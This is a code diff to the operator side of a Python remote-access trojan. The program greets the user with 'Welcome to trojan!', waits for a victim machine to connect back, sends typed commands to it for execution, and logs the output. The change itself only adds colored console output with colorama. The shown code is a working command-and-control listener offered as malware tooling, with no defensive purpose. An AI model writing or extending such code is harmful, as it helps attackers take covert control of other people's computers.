@@ -1,4 +1,7 @@
 import socket
+import colorama
+
+colorama.init(autoreset=True)
 
 def get_local_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -17,12 +20,12 @@ DC_MSG = "!dc"
 print("#"*32)
 print("###### Welcome to trojan! ###### ")
 print("#"*32)
-print("Waiting for incomming connections...")
+print(f"{colorama.Style.DIM}Waiting for incomming connections...", end=" ")
 
 s.bind(SERVER)
 s.listen()
 client, addr = s.accept()
-print("Connected from: ", addr)
+print(f"{colorama.Fore.GREEN}\nConnected from: {addr}")
 
 logs = open("./logs.log", "a")
 run = True
@@ -30,12 +33,12 @@ while run:
     try:
         cmd = ""
         while cmd == "":
-            cmd = input(">>> ")
+            cmd = input(colorama.Fore.CYAN + ">>> " + colorama.Fore.RESET)
 
         client.send(cmd.encode(FORMAT))
 
         if cmd == DC_MSG:
-            print("Disconnected...")
+            print(f"{colorama.Fore.RED}Disconnected...")
             logs.close()
             run = False
             s.close()
@@ -44,14 +47,14 @@ while run:
             continue
         msg = client.recv(BUFFER).decode(FORMAT)
         print(msg)
-        logs.write(f"OUTPUT FOR COMMAND: {cmd}\n")
+        logs.write(f"{colorama.Style.BRIGHT}Executable command: {cmd}\n")
         logs.write(msg)
     except KeyboardInterrupt:
-        print("\nDisconnected...")
+        print(f"{colorama.Fore.RED}\nDisconnected...")
         logs.close()
         run = False
         s.close()
     except:
-        print("Client lost... reconnected")
+        print(f"{colorama.Fore.RED}Client lost... reconnected")
         client, addr = s.accept()
-        print("Connected from: ", addr)
+        print(f"{colorama.Fore.GREEN}Connected from: ", addr)
